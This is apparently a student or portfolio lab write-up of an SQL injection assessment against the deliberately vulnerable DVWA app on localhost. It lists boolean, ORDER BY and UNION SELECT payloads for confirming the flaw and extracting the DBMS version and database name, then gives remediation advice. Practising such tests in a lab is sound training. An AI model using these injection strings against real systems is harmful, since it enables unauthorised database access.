Web Application Security Assessment – DVWA SQL Injection

Project Overview
This project demonstrates the identification and exploitation of an SQL Injection vulnerability in a controlled lab environment using Damn Vulnerable Web Application (DVWA).
The objective was to simulate a real-world web application penetration test and document findings using structured methodology.

Assessment Objectives
Identify SQL Injection vulnerability
Determine number of query fields
Extract DBMS version
Enumerate database name
Provide remediation recommendations

Tools & Environment
DVWA running on localhost 127.0.0.1/dvwa
MariaDB 11.8.5
Web browser (manual exploitation)
Debian-based environment

Exploitation Methodology
Vulnerability confirmation using boolean-based injection
' OR 1=1 #

Column enumeration using ORDER BY
1' ORDER BY 1 #

DBMS fingerprinting
UNION SELECT 1, VERSION()#

Database name extraction
UNION SELECT 1, DATABASE()#

Key Findings
Application vulnerable to SQL Injection
Backend DBMS: MariaDB 11.8.5
Database identified: dvwa
Input sanitization absent

Security Recommendations
Implement parameterized queries
Use prepared statements
Apply input validation
Deploy WAF monitoring
Conduct regular vulnerability assessments
